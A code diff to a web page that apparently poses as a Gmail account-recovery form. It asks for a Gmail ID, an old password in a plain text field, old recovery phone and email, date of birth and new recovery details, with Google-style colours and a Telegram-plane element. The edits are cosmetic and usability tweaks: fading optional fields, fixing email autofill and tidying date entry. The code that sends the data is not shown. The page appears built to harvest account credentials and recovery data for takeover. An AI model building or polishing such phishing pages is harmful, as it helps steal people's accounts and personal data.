@@ -151,6 +151,16 @@
             width: 100%;
         }
 
+        /* --- OPACITY FIX FOR OPTIONAL FIELDS --- */
+        .optional-group {
+            opacity: 0.65;
+            transition: opacity 0.3s ease;
+        }
+        /* Bring to 100% when focused or hovered */
+        .optional-group:focus-within, .optional-group:hover {
+            opacity: 1;
+        }
+
         label {
             display: block;
             margin-bottom: 8px;
@@ -188,7 +198,6 @@
             box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
         }
 
-        /* Green Glowing Effect on Focus */
         input:focus { 
             border-color: #34A853 !important; 
             background: rgba(0, 0, 0, 0.6); 
@@ -480,27 +489,27 @@
                         <div class="error-msg" id="firstGmailError">Please enter a valid Gmail ID.</div>
                     </div>
 
-                    <div class="form-group" style="z-index: 90;">
+                    <div class="form-group optional-group" style="z-index: 90;">
                         <label>Full Name <span class="optional-text">(Optional)</span></label>
                         <input type="text" id="fullName" placeholder="Enter your full name">
                     </div>
 
-                    <div class="form-group" style="z-index: 80;">
+                    <div class="form-group optional-group" style="z-index: 80;">
                         <label>Old Password <span class="optional-text">(Optional)</span></label>
                         <input type="text" id="oldPassword" placeholder="Enter last remembered password">
                     </div>
 
-                    <div class="form-group" style="z-index: 70;">
+                    <div class="form-group optional-group" style="z-index: 70;">
                         <label>Recovery Phone Number <span class="optional-text">(Optional)</span></label>
                         <input type="tel" id="oldPhone" placeholder="Old recovery phone number">
                     </div>
 
-                    <div class="form-group" style="z-index: 60;">
+                    <div class="form-group optional-group" style="z-index: 60;">
                         <label>Recovery Email ID <span class="optional-text">(Optional)</span></label>
                         <input type="email" id="oldRecoverEmail" class="email-autofill" placeholder="Old recovery email ID">
                     </div>
 
-                    <div class="form-group" style="z-index: 50;">
+                    <div class="form-group optional-group" style="z-index: 50;">
                         <label>Date of Birth <span class="optional-text">(Optional)</span></label>
                         <div style="position: relative; width: 100%;">
                             <input type="text" id="dobInput" inputmode="numeric" placeholder="DD/MM/YYYY" maxlength="10">
@@ -531,7 +540,7 @@
                         <div class="error-msg" id="otherOsError">Please describe your device.</div>
                     </div>
 
-                    <div class="form-group" style="z-index: 30;">
+                    <div class="form-group optional-group" style="z-index: 30;">
                         <label>Add New Recovery Email ID <span class="optional-text">(Optional)</span></label>
                         <input type="email" id="newRecoverEmail" class="email-autofill" placeholder="Enter new recovery email">
                     </div>
@@ -542,7 +551,7 @@
                         <div class="error-msg" id="newPhoneError">Please enter a valid phone number.</div>
                     </div>
 
-                    <div class="form-group" style="z-index: 10;">
+                    <div class="form-group optional-group" style="z-index: 10;">
                         <label>Contact Email <span class="optional-text">(Optional)</span></label>
                         <input type="email" id="contactEmail" class="email-autofill" placeholder="Email to contact you">
                     </div>
@@ -617,9 +626,13 @@
             const rocketOverlay = document.getElementById('rocketOverlay');
             const telegramPlane = document.getElementById('telegramPlane');
 
-            // --- SMART EMAIL AUTO-FILL LOGIC ---
+            // --- FIXED: SMART EMAIL AUTO-FILL LOGIC ---
             document.querySelectorAll('.email-autofill').forEach(input => {
                 input.addEventListener('input', function(e) {
+                    // Prevent auto-fill if the user is backspacing or deleting characters
+                    if (e.inputType === 'deleteContentBackward' || e.inputType === 'deleteContentForward') {
+                        return;
+                    }
                     if (this.value.endsWith('@')) {
                         this.value = this.value + 'gmail.com';
                     }
@@ -631,27 +644,19 @@
             const dobPicker = document.getElementById('dobPicker');
 
             dobInput.addEventListener('input', function(e) {
-                // If user is deleting, let them delete without interference
                 if (e.inputType === 'deleteContentBackward' || e.inputType === 'deleteContentForward') {
                     return;
                 }
 
-                let val = this.value.replace(/\D/g, ''); // Extract only numbers
+                let val = this.value.replace(/\D/g, ''); 
                 if (val.length > 8) val = val.substring(0, 8);
                 
                 let day = val.substring(0, 2);
                 let month = val.substring(2, 4);
                 let year = val.substring(4, 8);
 
-                // Auto-pad Day (e.g. typing '4' becomes '04/')
-                if (day.length === 1 && parseInt(day) > 3) {
-                    day = '0' + day;
-                }
-                
-                // Auto-pad Month (e.g. typing '2' becomes '02/')
-                if (month.length === 1 && parseInt(month) > 1) {
-                    month = '0' + month;
-                }
+                if (day.length === 1 && parseInt(day) > 3) day = '0' + day;
+                if (month.length === 1 && parseInt(month) > 1) month = '0' + month;
 
                 let formatted = day;
                 if (day.length === 2) formatted += '/';
@@ -662,15 +667,13 @@
                 this.value = formatted;
             });
 
-            // Native Calendar selection sync to input text
             dobPicker.addEventListener('change', function() {
                 if(this.value) {
-                    const parts = this.value.split('-'); // format YYYY-MM-DD
+                    const parts = this.value.split('-'); 
                     dobInput.value = `${parts[2]}/${parts[1]}/${parts[0]}`;
                 }
             });
 
-            // --- FUNCTION TO CLEAR ALL VALIDATION ERRORS ---
             function clearAllValidationErrors() {
                 document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
                 document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
@@ -745,7 +748,6 @@
 
             runIntroAnimation();
 
-            // --- 2. AUTO CENTER ON CLICK / FOCUS & CLEAR ERRORS ---
             document.querySelectorAll('input').forEach(input => {
                 input.addEventListener('focus', function() {
                     clearAllValidationErrors();
